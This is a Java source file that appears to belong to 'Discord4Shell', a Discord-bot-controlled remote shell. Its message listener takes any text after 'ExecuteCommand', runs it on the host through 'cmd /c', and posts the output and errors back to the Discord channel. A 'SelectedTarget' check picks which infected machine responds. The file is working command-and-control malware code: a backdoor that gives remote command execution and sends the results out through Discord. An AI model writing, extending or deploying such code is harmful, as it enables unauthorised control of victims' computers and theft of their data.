package org.example.commands;

import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Objects;

import static org.example.Discord4Shell.Discord4Shell.user;
import static org.example.commands.SelectTargetMessage.SelectedTarget;
import java.io.BufferedReader;

@SuppressWarnings("deprecation")
public class ExecuteCommandMessage extends ListenerAdapter {

    public static String Message = null;
    public static ArrayList<String> message = new ArrayList<>();
    public void onMessageReceived(MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) {
            return;
        }

        if (event.getMessage().getContentRaw().contains("ExecuteCommand")) {
            if (Objects.equals(SelectedTarget, user)) {
                String[] args = event.getMessage().getContentRaw().split(" ");
                int index = 1;
                while (index < args.length) {
                    message.add(args[index]);
                    index++;
                }
                Message = String.join(" ", message);
                message.clear();

                try {
                    Process process = Runtime.getRuntime().exec("cmd /c " + Message);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    BufferedReader error = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        event.getChannel().sendMessage(line).queue();
                    }
                    while ((line = error.readLine()) != null) {
                        event.getChannel().sendMessage(line).queue();
                    }
                    reader.close();
                    error.close();
                } catch (IOException e) {
                    event.getChannel().sendMessage("Error: " + e).queue();
                }
            }
        }
    }
}
